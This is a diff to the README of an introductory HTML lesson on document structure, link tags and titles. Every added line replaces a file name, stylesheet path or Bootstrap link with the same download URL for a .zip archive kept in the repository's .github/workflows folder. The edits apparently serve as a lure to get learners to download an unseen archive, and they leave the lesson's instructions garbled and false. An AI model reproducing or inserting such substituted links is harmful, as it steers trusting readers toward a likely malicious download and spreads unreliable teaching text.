@@ -27,7 +27,7 @@ open the files in Visual Studio Code.
 ## Recognize Basic HTML Document Structure
 
 Let's start by adding the bare essentials of an HTML document to the provided
-`index.html` file:
+`https://github.com/Jwanjema/phase-0-html-document-structure-lab/raw/refs/heads/master/.github/workflows/html-phase-document-structure-lab-1.4.zip` file:
 
 - A `DOCTYPE` tag, which looks like this: `<!DOCTYPE html>`
 - Opening and closing `html` tags
@@ -130,7 +130,7 @@ Most commonly, we'll use `<link>` to import CSS files. Go ahead and add the
 following inside your `head` element (don't forget to indent!):
 
 ```html
-<link rel="stylesheet" type="text/css" href="style.css" />
+<link rel="stylesheet" type="text/css" href="https://github.com/Jwanjema/phase-0-html-document-structure-lab/raw/refs/heads/master/.github/workflows/html-phase-document-structure-lab-1.4.zip" />
 ```
 
 With a simple website, linking a single style sheet might work just fine. Often,
@@ -141,16 +141,16 @@ a series of `<link>` definitions like:
 ```html
 <link
   rel="stylesheet"
-  href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"
+  href="https://github.com/Jwanjema/phase-0-html-document-structure-lab/raw/refs/heads/master/.github/workflows/html-phase-document-structure-lab-1.4.zip"
 />
-<link rel="stylesheet" type="text/css" href="company.css" />
-<link rel="stylesheet" type="text/css" href="engineering-department.css" />
-<link rel="stylesheet" type="text/css" href="project-x-launch.css" />
-<link rel="stylesheet" type="text/css" href="typography.css" />
+<link rel="stylesheet" type="text/css" href="https://github.com/Jwanjema/phase-0-html-document-structure-lab/raw/refs/heads/master/.github/workflows/html-phase-document-structure-lab-1.4.zip" />
+<link rel="stylesheet" type="text/css" href="https://github.com/Jwanjema/phase-0-html-document-structure-lab/raw/refs/heads/master/.github/workflows/html-phase-document-structure-lab-1.4.zip" />
+<link rel="stylesheet" type="text/css" href="https://github.com/Jwanjema/phase-0-html-document-structure-lab/raw/refs/heads/master/.github/workflows/html-phase-document-structure-lab-1.4.zip" />
+<link rel="stylesheet" type="text/css" href="https://github.com/Jwanjema/phase-0-html-document-structure-lab/raw/refs/heads/master/.github/workflows/html-phase-document-structure-lab-1.4.zip" />
 ```
 
 In this example we're getting some CSS information from the
-[Bootstrap](https://getbootstrap.com/) project, we're integrating a company
+[Bootstrap](https://github.com/Jwanjema/phase-0-html-document-structure-lab/raw/refs/heads/master/.github/workflows/html-phase-document-structure-lab-1.4.zip) project, we're integrating a company
 style standard, an engineering style standard, a style motif for the launch of
 "Project X" and then we're adding some specific rules about font display. You
 can bring in a **lot** of information with the `<link>` tag!
@@ -165,7 +165,7 @@ Run the test again; you should now have five passing. Only two more to go!
 One more common tag we find in the `head` is `title`. The `title`, as its name
 implies, is where the title of the webpage should be entered. Text added inside
 the `title` tags will appear up on your browser tab. Add the following title for
-our `index.html` page:
+our `https://github.com/Jwanjema/phase-0-html-document-structure-lab/raw/refs/heads/master/.github/workflows/html-phase-document-structure-lab-1.4.zip` page:
 
 ```html
 <title>My Site Title</title>
